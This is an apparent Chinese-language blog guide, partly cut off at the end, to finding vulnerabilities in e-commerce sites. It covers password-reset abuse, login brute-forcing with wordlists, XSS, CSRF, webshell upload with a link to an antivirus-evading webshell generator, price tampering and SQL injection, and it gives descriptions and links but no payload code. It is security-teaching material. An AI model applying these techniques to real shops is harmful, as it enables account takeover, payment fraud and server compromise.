<h2 id="&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;"><a href="#&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;" class="headerlink" title="&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;"></a>&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;</h2><h3 id="&#x77ED;&#x4FE1;&#x8F70;&#x70B8;-1"><a href="#&#x77ED;&#x4FE1;&#x8F70;&#x70B8;-1" class="headerlink" title="&#x77ED;&#x4FE1;&#x8F70;&#x70B8;"></a>&#x77ED;&#x4FE1;&#x8F70;&#x70B8;</h3><p>&#x53C2;&#x8003;&#x6CE8;&#x518C;&#x8D26;&#x53F7;&#x65F6;&#x7684;&#x77ED;&#x4FE1;&#x8F70;&#x70B8;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223458-8246b0b4-cbfc-1.png" alt></p>
<h3 id="&#x4EFB;&#x610F;&#x5BC6;&#x7801;&#x91CD;&#x7F6E;"><a href="#&#x4EFB;&#x610F;&#x5BC6;&#x7801;&#x91CD;&#x7F6E;" class="headerlink" title="&#x4EFB;&#x610F;&#x5BC6;&#x7801;&#x91CD;&#x7F6E;"></a>&#x4EFB;&#x610F;&#x5BC6;&#x7801;&#x91CD;&#x7F6E;</h3><p>&#x53C2;&#x8003;&#x4EFB;&#x610F;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#x7801;&#x7684;Bypass</p>
<p>&#x6B64;&#x5916;&#xFF1A;&#x8FD8;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="https://www.jianshu.com/p/f1dbd4482cc0" target="_blank" rel="noopener">&#x4EFB;&#x610F;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x91CD;&#x7F6E;&#x7684;10&#x79CD;&#x59FF;&#x52BF;</a></p>
<h2 id="&#x767B;&#x5F55;&#x754C;&#x9762;"><a href="#&#x767B;&#x5F55;&#x754C;&#x9762;" class="headerlink" title="&#x767B;&#x5F55;&#x754C;&#x9762;"></a>&#x767B;&#x5F55;&#x754C;&#x9762;</h2><h3 id="&#x66B4;&#x529B;&#x7834;&#x89E3;"><a href="#&#x66B4;&#x529B;&#x7834;&#x89E3;" class="headerlink" title="&#x66B4;&#x529B;&#x7834;&#x89E3;"></a>&#x66B4;&#x529B;&#x7834;&#x89E3;</h3><p>&#x7ECF;&#x8FC7;&#x5BF9;&#x7F51;&#x7AD9;&#x7684;&#x6D4B;&#x8BD5;&#xFF0C;&#x53D1;&#x73B0;&#x5BF9;&#x767B;&#x5F55;&#x6B21;&#x6570;&#x5931;&#x8D25;&#x6CA1;&#x6709;&#x9650;&#x5236;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x9A8C;&#x8BC1;&#x7801;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;burpsuite&#x8DD1;&#x5927;&#x578B;&#x5B57;&#x5178;&#xFF0C;&#x4ECE;&#x800C;&#x66B4;&#x529B;&#x7834;&#x89E3;&#x8D26;&#x53F7;&#x5BC6;&#x7801;</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223506-8713ecec-cbfc-1.png" alt></p>
<p>&#x63D0;&#x4F9B;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x751F;&#x6210;&#x5B57;&#x5178;&#x65B9;&#x5F0F;</p>
<ul>
<li><p>Github&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x6536;&#x96C6;&#x597D;&#x7684;&#x5B57;&#x5178;<br><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a><br>&#x66F4;&#x591A;&#x7684;&#x53EF;&#x4EE5;&#x5728;Github&#x4E0A;&#x81EA;&#x884C;&#x5BFB;&#x627E;</p>
</li>
<li><p>&#x53EF;&#x80FD;&#x4F60;&#x9700;&#x8981;&#x751F;&#x6210;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x5B9A;&#x5236;&#x7684;<br><a href="https://www.itxueke.com/tools/pass/#" target="_blank" rel="noopener">&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5730;&#x5740;&#x4E00;</a><br><a href="http://xingchen.pythonanywhere.com/index" target="_blank" rel="noopener">&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5730;&#x5740;&#x4E8C;</a></p>
</li>
<li><p>&#x4E0B;&#x9762;&#x7684;py&#x811A;&#x672C;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4F7F;&#x7528;</p>
</li>
</ul>
<p><strong>pydictor</strong> <a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">&#x4E0B;&#x8F7D;&#x5730;&#x5740;</a> <a href="https://www.ddosi.com/b172/" target="_blank" rel="noopener">&#x4F7F;&#x7528;&#x6307;&#x5357;</a></p>
<ul>
<li>somd5 &#x63D0;&#x4F9B;&#x7684;&#x5B57;&#x5178;&#xFF1A;<br><a href="https://www.somd5.com/download/dict/" target="_blank" rel="noopener">https://www.somd5.com/download/dict/</a></li>
</ul>
<h3 id="&#x8D8A;&#x6743;"><a href="#&#x8D8A;&#x6743;" class="headerlink" title="&#x8D8A;&#x6743;"></a>&#x8D8A;&#x6743;</h3><p>&#x8D8A;&#x6743;&#x662F;&#x4E2A;&#x6BD4;&#x8F83;&#x62BD;&#x8C61;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x7BC7;&#x5E45;&#x7684;&#x539F;&#x56E0;&#x5C31;&#x4E0D;&#x5C55;&#x5F00;&#x8BBA;&#x8FF0;&#x4E86;</p>
<p>&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF1A;<br><a href="https://wooyun.js.org/drops/%E6%88%91%E7%9A%84%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%81%93.html" target="_blank" rel="noopener">&#x6211;&#x7684;&#x8D8A;&#x6743;&#x4E4B;&#x9053;- &#x5C0F;&#x5DDD;</a><br><a href="https://www.anquanke.com/post/id/84892" target="_blank" rel="noopener">&#x3010;&#x6280;&#x672F;&#x5206;&#x4EAB;&#x3011;&#x804A;&#x804A;&#x8D8A;&#x6743;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;</a></p>
<h1 id="&#x8FDB;&#x5165;&#x5546;&#x57CE;"><a href="#&#x8FDB;&#x5165;&#x5546;&#x57CE;" class="headerlink" title="&#x8FDB;&#x5165;&#x5546;&#x57CE;"></a>&#x8FDB;&#x5165;&#x5546;&#x57CE;</h1><h2 id="&#x53CD;&#x5C04;&#x578B;XSS"><a href="#&#x53CD;&#x5C04;&#x578B;XSS" class="headerlink" title="&#x53CD;&#x5C04;&#x578B;XSS"></a>&#x53CD;&#x5C04;&#x578B;XSS</h2><p>&#x8FDB;&#x5165;&#x5546;&#x57CE;&#x4E4B;&#x540E;&#x5F53;&#x7136;&#x662F;&#x6311;&#x9009;&#x7269;&#x54C1;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x641C;&#x7D22;&#x6846;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x53CD;&#x5C04;&#x578B;xss</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223509-88988582-cbfc-1.png" alt></p>
<p>&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;&#x63A8;&#x8350;&#xFF1A;<br>&#x4E94;&#x9053;&#x53E3;&#x6740;&#x6C14; &#x2014;&#x2014;&#x300B; <a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">Bypass xss&#x8FC7;&#x6EE4;&#x7684;&#x6D4B;&#x8BD5;&#x65B9;&#x6CD5;</a><br>&#x5FC3;&#x4F24;&#x7684;&#x7626;&#x5B50; &#x2014;&#x2014;&#x300B;<a href="https://shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&amp;BugSearch%5Btitle%5D=&amp;BugSearch%5Bvendor%5D=&amp;BugSearch%5Bauthor%5D=%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90&amp;BugSearch%5Bbug_type%5D=&amp;BugSearch%5Bbug_level_by_whitehat%5D=&amp;BugSearch%5Bbug_level_by_vendor%5D=&amp;BugSearch%5Brank_by_whitehat%5D=&amp;BugSearch%5Bbug_date%5D=&amp;page=1" target="_blank" rel="noopener">&#x5FC3;&#x4F24;&#x7684;&#x7626;&#x5B50;&#x7CFB;&#x5217;&#x6559;&#x7A0B;</a></p>
<p><strong>&#x6B64;&#x5916;&#xFF1A;&#x6D4B;&#x8BD5; XSS &#x5C31;&#x4E0D;&#x8981;&#x653E;&#x8FC7;&#x6BCF;&#x4E00;&#x4E2A;&#x641C;&#x7D22;&#x6846;&#xFF0C;&#x6709;&#x4E00;&#x4E9B;&#x5546;&#x57CE;&#x4E2D;&#x7ECF;&#x5E38;&#x88AB;&#x9057;&#x6F0F;&#x8FC7;&#x6EE4;&#x7684;&#x4E00;&#x4E9B;&#x5730;&#x65B9;</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223514-8b88fb32-cbfc-1.png" alt></p>
<p>&#x6BD4;&#x5982;&#x66FE;&#x7ECF;&#x6211;&#x6316;&#x5230;&#x67D0;&#x7AD9;&#x70B9;&#x8FD9;&#x7C7B;&#x76F8;&#x5BF9;&#x9690;&#x853D;&#x7684;&#x641C;&#x7D22;&#x6846;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223522-904a63ae-cbfc-1.png" alt></p>
<p><strong>&#x53EF;&#x6839;&#x636E;&#x73B0;&#x6709;&#x60C5;&#x666F;&#x81EA;&#x884C;&#x4F7F;&#x7528;&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;</strong></p>
<h2 id="&#x5B58;&#x50A8;&#x578B;-XSS"><a href="#&#x5B58;&#x50A8;&#x578B;-XSS" class="headerlink" title="&#x5B58;&#x50A8;&#x578B; XSS"></a>&#x5B58;&#x50A8;&#x578B; XSS</h2><p>&#x5728;&#x4E2A;&#x4EBA;&#x8D44;&#x6599;&#x5904;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x5B58;&#x50A8;&#x578B; XSS<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223525-91d86d56-cbfc-1.png" alt></p>
<p><strong>&#x7279;&#x522B;&#x662F;&#x5728;&#x4E2A;&#x4EBA;&#x5730;&#x5740;&#x680F;&#xFF0C;&#x56E0;&#x4E3A;&#x53EF;&#x80FD;&#x624B;&#x673A;&#x4FE1;&#x606F;&#x8981;&#x6C42;&#x5FC5;&#x987B;&#x662F;&#x6570;&#x5B57;&#xFF0C;&#x90AE;&#x7BB1;&#x683C;&#x5F0F;&#x5FC5;&#x987B;&#x662F;&#x6570;&#x5B57;+&#x5B57;&#x6BCD;&#xFF0C;&#x4F46;&#x662F;&#x4E2A;&#x4EBA;&#x5730;&#x5740;&#x680F;&#x5F80;&#x5F80;&#x6CA1;&#x6709;&#x505A;&#x51FA;&#x592A;&#x591A;&#x7684;&#x8FC7;&#x6EE4;</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223529-94400964-cbfc-1.png" alt></p>
<p>&#x6BD4;&#x5982;&#x6211;&#x66FE;&#x5728;&#x8865;&#x5929;&#x6316;&#x5230;&#x5173;&#x4E8E;&#x4E2A;&#x4EBA;&#x5730;&#x5740;&#x680F;&#x7684;&#x5B58;&#x50A8;&#x578B;XSS,&#x90FD;&#x662F;&#x51E0;&#x4E4E;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;&#x7684;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223532-9659d48c-cbfc-1.png" alt></p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>&#x4E0E;XSS&#x5BF9;&#x5E94;&#x7684;&#xFF0C;&#x5728;&#x5546;&#x57CE;&#x5185;&#x90E8;&#x540C;&#x6837;&#x53EF;&#x80FD;&#x5B58;&#x5728; CSRF</p>
<p>&#x4F46;&#x7531;&#x4E8E;&#x73B0;&#x5728;&#x5927;&#x591A;&#x6570;&#x7F51;&#x7AD9;&#x90FD;&#x5177;&#x5907;&#x4E86; CSRF token &#xFF0C;&#x4E14;&#x9A8C;&#x8BC1;&#x4E86; referer</p>
<p>CSRF&#x7684;&#x5206;&#x6790;&#x548C;&#x5229;&#x7528;&#x5728; DVWA &#x9776;&#x573A;&#x5DF2;&#x7ECF;&#x4ECE; Low&#xFF0C;Mediun&#xFF0C; High&#xFF0C; Impossible &#x51E0;&#x79CD;&#x96BE;&#x5EA6;&#x9610;&#x8FF0;&#x4E86; CSRF &#x7684;&#x5206;&#x6790;&#x548C;&#x5229;&#x7528;&#xFF0C;&#x5DF2;&#x7ECF;&#x5F88;&#x8BE6;&#x7EC6;&#x4E86;,&#x800C;&#x4E14;&#x7EA2;&#x65E5;&#x5B89;&#x5168;&#x56E2;&#x961F;&#x51FA;&#x7684;&#x6587;&#x7AE0;&#x5DF2;&#x7ECF;&#x5F88;&#x8BE6;&#x7EC6;&#x4E86; &#x2014;&#x2014;<a href="https://xz.aliyun.com/t/6128" target="_blank" rel="noopener">[&#x7EA2;&#x65E5;&#x5B89;&#x5168;]Web&#x5B89;&#x5168;Day3 - CSRF&#x5B9E;&#x6218;&#x653B;&#x9632;</a></p>
<p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;,&#x5982; <a href="https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee" target="_blank" rel="noopener">Bypassing CSRF Protection</a> &#x2014;&#x2014;&#x300B;&#x5148;&#x77E5;&#x6709;&#x4E86;&#x7FFB;&#x8BD1;&#x6587;&#x7AE0; <a href="https://xz.aliyun.com/t/6176" target="_blank" rel="noopener">&#x7ED5;&#x8FC7;CSRF&#x9632;&#x5FA1;</a></p>
<p>&#x5177;&#x4F53;&#x8FD8;&#x662F;&#x53C2;&#x8003;&#x4E4C;&#x4E91;&#x5427; &#x2014;&#x2014;&#x300B; <a href="https://shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&amp;BugSearch%5Btitle%5D=&amp;BugSearch%5Bvendor%5D=&amp;BugSearch%5Bauthor%5D=&amp;BugSearch%5Bbug_type%5D=CSRF&amp;BugSearch%5Bbug_level_by_whitehat%5D=&amp;BugSearch%5Bbug_level_by_vendor%5D=&amp;BugSearch%5Brank_by_whitehat%5D=&amp;BugSearch%5Bbug_date%5D=&amp;page=1" target="_blank" rel="noopener">&#x4E4C;&#x4E91;&#x6F0F;&#x6D1E;&#x5E93;&#x4E4B;CSRF</a></p>
<h2 id="&#x4E0A;&#x4F20;&#x5934;&#x50CF;&#x83B7;&#x5F97;shell"><a href="#&#x4E0A;&#x4F20;&#x5934;&#x50CF;&#x83B7;&#x5F97;shell" class="headerlink" title="&#x4E0A;&#x4F20;&#x5934;&#x50CF;&#x83B7;&#x5F97;shell"></a>&#x4E0A;&#x4F20;&#x5934;&#x50CF;&#x83B7;&#x5F97;shell</h2><p>&#x8FD9;&#x91CC;&#x6CA1;&#x529E;&#x6CD5;&#x8FDB;&#x884C;&#x4E91;&#x6F14;&#x793A;&#x4E86;&#x2026;</p>
<p>&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x7684;&#x5C0F;&#x7ED3;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6211;&#x7684;&#x535A;&#x5BA2; &#x2014;&#x2014;&#x300B; <a href="https://p2hm1n.github.io/2019/07/30/Upload-labs-Writeup/#more" target="_blank" rel="noopener">&#x901A;&#x8FC7; Upload-labs &#x638C;&#x63E1;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;</a></p>
<p>&#x540C;&#x65F6;&#x63A8;&#x8350;&#x5927;&#x5BB6;&#x4E00;&#x4E2A;Google&#x7684;&#x63D2;&#x4EF6;&#x2014;&#x2014;&#x300B;Wappalyzer</p>
<blockquote>
<p>Wappalyzer &#x662F;&#x4E00;&#x6B3E;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x8BC6;&#x522B; WEB &#x7F51;&#x7AD9;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x5EFA;&#x7AD9;&#x7A0B;&#x5E8F;&#x4EE5;&#x53CA;&#x4F7F;&#x7528;&#x4E86;&#x54EA;&#x4E9B;&#x76F8;&#x5173;&#x6280;&#x672F;&#x7684;&#x5DE5;&#x5177;&#x7684;&#x8C37;&#x6B4C;&#x6D4F;&#x89C8;&#x5668;&#x6269;&#x5C55;&#x63D2;&#x4EF6;&#x3002;&#x770B;&#x5230;&#x597D;&#x7684;&#x7F51;&#x7AD9;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; Wappalyzer &#x8BC6;&#x522B;&#x7F51;&#x7AD9;&#x6240;&#x7528;&#x7684;&#x6240;&#x6709;&#x6280;&#x672F;&#xFF0C;&#x53EF;&#x4EE5;&#x5BF9;&#x7F51;&#x7AD9;&#x642D;&#x5EFA;&#x8D77;&#x5230;&#x4E0D;&#x9519;&#x7684;&#x53C2;&#x8003;&#x4F5C;&#x7528;&#x3002;</p>
</blockquote>
<p>&#x5229;&#x7528;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x65F6;&#xFF0C;<strong>&#x6839;&#x636E;&#x76F8;&#x5E94;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x6F0F;&#x6D1E;&#x7EC4;&#x5408;</strong>&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x80FD;&#x5B9E;&#x73B0;&#x5DE7;&#x5999;&#x7684;&#x7ED5;&#x8FC7;&#x6548;&#x679C; &#x2014;&#x2014;&#x300B; <a href="https://www.freebuf.com/articles/web/192063.html" target="_blank" rel="noopener">Web&#x4E2D;&#x95F4;&#x4EF6;&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x603B;&#x7ED3;</a></p>
<p>&#x53EF;&#x80FD;&#x4F60;&#x7684;webshell&#x4F1A;&#x88AB;&#x6740;&#x6389;&#xFF1F;<br>&#x8FD9;&#x91CC;&#x63A8;&#x8350; Github&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x9879;&#x76EE; &#x2014;&#x2014;&#x300B;<a href="https://github.com/yzddmr6/webshell-venom" target="_blank" rel="noopener">&#x514D;&#x6740;webshell&#x65E0;&#x9650;&#x751F;&#x6210;&#x5DE5;&#x5177;(&#x5229;&#x7528;&#x968F;&#x673A;&#x5F02;&#x6216;&#x65E0;&#x9650;&#x514D;&#x6740;D&#x76FE;)</a></p>
<h1 id="&#x8D2D;&#x4E70;&#x7269;&#x54C1;"><a href="#&#x8D2D;&#x4E70;&#x7269;&#x54C1;" class="headerlink" title="&#x8D2D;&#x4E70;&#x7269;&#x54C1;"></a>&#x8D2D;&#x4E70;&#x7269;&#x54C1;</h1><h2 id="&#x4FEE;&#x6539;&#x4EF7;&#x683C;"><a href="#&#x4FEE;&#x6539;&#x4EF7;&#x683C;" class="headerlink" title="&#x4FEE;&#x6539;&#x4EF7;&#x683C;"></a>&#x4FEE;&#x6539;&#x4EF7;&#x683C;</h2><p>&#x8868;&#x793A;&#x81EA;&#x5DF1;&#x66FE;&#x7ECF;&#x4E5F;&#x80FD;&#x4E70;&#x5F97;&#x8D77;&#x9762;&#x5305;&#x673A;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223534-9765c1d8-cbfc-1.png" alt></p>
<p>&#x5177;&#x4F53;&#x6709;&#x51E0;&#x65B9;&#x9762;&#xFF1A;&#x7B2C;&#x4E00;&#x662F;&#x5728;&#x8D2D;&#x4E70;&#x4EA7;&#x54C1;&#x8FC7;&#x7A0B;&#x4E2D;&#x4FEE;&#x6539;&#x4EA7;&#x54C1;&#x6570;&#x91CF;&#x3001;&#x4EF7;&#x683C;&#xFF1B;&#x7B2C;&#x4E8C;&#x662F;&#x5728;&#x652F;&#x4ED8;&#x65F6;&#x4FEE;&#x6539;&#x603B;&#x4EF7;&#x683C;&#x6216;&#x8005;&#x4F18;&#x60E0;&#x4EF7;&#x683C;&#xFF1B;&#x7B2C;&#x4E09;&#x662F;&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x5145;&#x503C;&#x4EF7;&#x683C;</p>
<p>&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x5145;&#x503C;&#x4EF7;&#x683C;&#x7684;&#x6781;&#x5176;&#x7F55;&#x89C1;&#xFF0C;&#x8FD9;&#x91CC;&#x7ED9;&#x51FA;&#x4E4C;&#x4E91;&#x7684;&#x4E00;&#x4E2A;&#x6848;&#x4F8B; &#x2014;&#x2014;&#x300B; <a href="https://shuimugan.com/bug/view?bug_no=2272" target="_blank" rel="noopener">&#x987A;&#x4E30;&#x5B9D;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x6F0F;&#x6D1E;</a></p>
<p>&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x6BD4;&#x8F83;&#x7F55;&#x89C1;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x8865;&#x5145;&#x4E00;&#x4E9B;&#x4E4C;&#x4E91;&#x6848;&#x4F8B;&#x4F9B;&#x5927;&#x5BB6;&#x53C2;&#x8003; &#x2014;&#x2014;&#x300B; <a href="http://www.anquan.us/search?keywords=%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&amp;content_search_by=by_bugs" target="_blank" rel="noopener">&#x4E4C;&#x4E91;&#x6848;&#x4F8B;-&#x652F;&#x4ED8;&#x903B;&#x8F91;&#x6F0F;&#x6D1E;</a></p>
<h2 id="&#x5B58;&#x50A8;&#x578B;-XSS-1"><a href="#&#x5B58;&#x50A8;&#x578B;-XSS-1" class="headerlink" title="&#x5B58;&#x50A8;&#x578B; XSS"></a>&#x5B58;&#x50A8;&#x578B; XSS</h2><p>&#x95EE;&#xFF1A;&#x4E0D;&#x662F;&#x4E4B;&#x524D;&#x5DF2;&#x7ECF;&#x5199;&#x8FC7;&#x4E2A;&#x4EBA;&#x8D44;&#x6599;&#x5904;&#x7684;&#x5B58;&#x50A8;&#x578B; XSS &#x5417;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD9;&#x91CC;&#x8FD8;&#x8981;&#x5728;&#x5199;&#x4E00;&#x904D;&#xFF1F;<br>&#x7B54;&#xFF1A;&#x53EF;&#x80FD;&#x6709;&#x7684;&#x7F51;&#x7AD9;&#x6CE8;&#x610F;&#x8FC7;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x4E2A;&#x4EBA;&#x8D44;&#x6599;&#x90A3;&#x4E2A;&#x5165;&#x53E3;&#x5DF2;&#x7ECF;&#x505A;&#x51FA;&#x4E86;&#x8FC7;&#x6EE4;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x8D2D;&#x4E70;&#x7269;&#x54C1;&#x65F6;&#x6DFB;&#x52A0;&#x7684;&#x5730;&#x5740;&#x786E;&#x6CA1;&#x6709;&#x505A;&#x51FA;&#x8FC7;&#x6EE4;</p>
<p>&#x6BD4;&#x5982;&#x66FE;&#x7ECF;&#x5728;&#x5BF9;&#x67D0;&#x7F51;&#x7AD9;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53D1;&#x73B0;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x7684;&#x5730;&#x5740;&#x680F;&#x5BF9;&#x8F93;&#x5165;&#x7684;payload&#x505A;&#x51FA;&#x4E86;&#x8FC7;&#x6EE4;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x8D2D;&#x4E70;&#x7269;&#x54C1;&#x91CD;&#x65B0;&#x6DFB;&#x52A0;&#x5730;&#x5740;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4EE3;&#x7801;&#x6CA1;&#x6709;&#x5BF9;&#x5176;&#x505A;&#x51FA;&#x8FC7;&#x6EE4;&#xFF0C;&#x56E0;&#x6B64;&#x5BFC;&#x81F4;&#x4E86;&#x5B58;&#x50A8;&#x578B; XSS<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223553-a2e57b2a-cbfc-1.png" alt></p>
<h1 id="SQL&#x6CE8;&#x5165;"><a href="#SQL&#x6CE8;&#x5165;" class="headerlink" title="SQL&#x6CE8;&#x5165;"></a>SQL&#x6CE8;&#x5165;</h1><p>&#x4E4B;&#x6240;&#x4EE5;&#x628A;sql&#x6CE8;&#x5165;&#x7ED9;&#x5355;&#x72EC;&#x5217;&#x51FA;&#x6765;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;sql&#x6CE8;&#x5165;&#x7684;&#x89E6;&#x53D1;&#x70B9;&#x771F;&#x7684;&#x592A;&#x591A;&#x4E86;&#xFF0C; <strong>&#x589E; &#x5220; &#x6539; &#x67E5;</strong>&#xFF0C;&#x4E00;&#x5207;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x4EA4;&#x4E92;&#x7684;&#x5730;&#x65B9;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x8FDB;&#x884C;sql&#x6CE8;&#x5165;&#x3002;&#x4ECE;&#x6CE8;&#x518C;&#x8D26;&#x53F7;&#xFF0C;&#x5230;&#x8D2D;&#x4E70;&#x7269;&#x54C1;&#x7684;&#x5B8C;&#x6210;&#x3002;&#x6BCF;&#x4E00;&#x4E2A;GET&#xFF0C;POST&#x7684;&#x53C2;&#x6570;&#x90FD;&#x53EF;&#x80FD;&#x5B58;&#x5728;sql&#x6CE8;&#x5165;&#xFF0C;&#x6240;&#x4EE5;&#x5927;&#x5BB6;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;&#x8DB3;&#x591F;&#x7684;&#x8010;&#x5FC3;&#x548C;&#x7EC6;&#x5FC3;&#x3002;&#x6211;&#x66FE;&#x7ECF;&#x5C31;&#x6709;&#x53EA;&#x5355;&#x72EC;&#x5BF9;&#x6211;&#x8BA4;&#x4E3A;&#x5728;&#x7F51;&#x9875;&#x4E0A;&#x6709;&#x56DE;&#x663E;&#x7684;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x7684;&#x574F;&#x4E60;&#x60EF;&#xFF0C;&#x56E0;&#x6B64;&#x9057;&#x6F0F;&#x4E86;&#x633A;&#x591A;&#x6D4B;&#x8BD5;&#x7684;&#x70B9;&#xFF0C;&#x6240;&#x4EE5;&#x5E0C;&#x671B;&#x5927;&#x5BB6;&#x4E0D;&#x8981;toulan&#x7684;&#x5FFD;&#x7565;&#x6389;&#x4E00;&#x4E9B;&#x53C2;&#x6570;&#x3002;</p>
<p>&#x5173;&#x4E8E;sql&#x6CE8;&#x5165;&#x7684;&#x7BC7;&#x5E45;&#x4E5F;&#x662F;&#x5DE8;&#x5927;&#x7684;&#xFF0C;&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7279;&#x6027;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;&#x4E5F;&#x662F;&#x5343;&#x5947;&#x767E;&#x602A;&#xFF0C;&#x8FD9;&#x91CC;&#x4E5F;&#x4E0D;&#x8BE6;&#x7EC6;&#x5C55;&#x5F00;&#x8BBA;&#x8FF0;&#x4E86;</p>
<p>&#x535A;&#x5BA2;&#x91CC;&#x5199;&#x4E86;&#x4E00;&#x4E9B;sql&#x6CE8;&#x5165;&#x7684;payload&#x548C;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x7ED5;&#x8FC7; &#x2014;&#x2014;&#x300B; <a href="https://p2hm1n.github.io/2019/06/07/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E6%8A%8A%E6%A2%AD/#more" target="_blank" rel="noopener">SQL&#x6CE8;&#x5165;&#x4E00;&#x628A;&#x68AD;</a></p>
<h1 id="&#x5199;&#x5728;&#x6700;&#x540E;"><a href="#&#x5199;&#x5728;&#x6700;&#x540E;" class="headerlink" title="&#x5199;&#x5728;&#x6700;&#x540E;"></a>&#x5199;&#x5728;&#x6700;&#x540E;</h1><p>&#x95EE;&#xFF1A;&#x5546;&#x57CE;&#x5C31;&#x53EA;&#x6709;&#x8FD9;&#x4E9B;&#x6F0F;&#x6D1E;&#x5417;&#xFF1F;<br>&#x7B54;&#xFF1A;&#x5F53;&#x7136;&#x4E0D;&#x662F;&#x7684;&#xFF0C;&#x53EF;&#x80FD;&#x7684;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5F88;&#x591A;&#xFF0C;&#x672C;&#x6587;&#x4EC5;&#x8D2D;&#x7269;&#x6D41;&#x7A0B;&#x4E00;&#x4E2A;&#x601D;&#x8DEF;&#x8FDB;&#x884C;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#xFF0C;&#x53EA;&#x7ED9;&#x90A3;&#x4E9B;&#x7EC3;&#x4E60;&#x5B8C;&#x9776;&#x573A;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x77E5;&#x9053;&#x5982;&#x4F55;&#x5BF9;&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#x4E0B;&#x624B;&#x7684;&#x670B;&#x53CB;&#x4EEC;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x5C0F;&#x601D;&#x8DEF;&#x3002;&#x53EF;&#x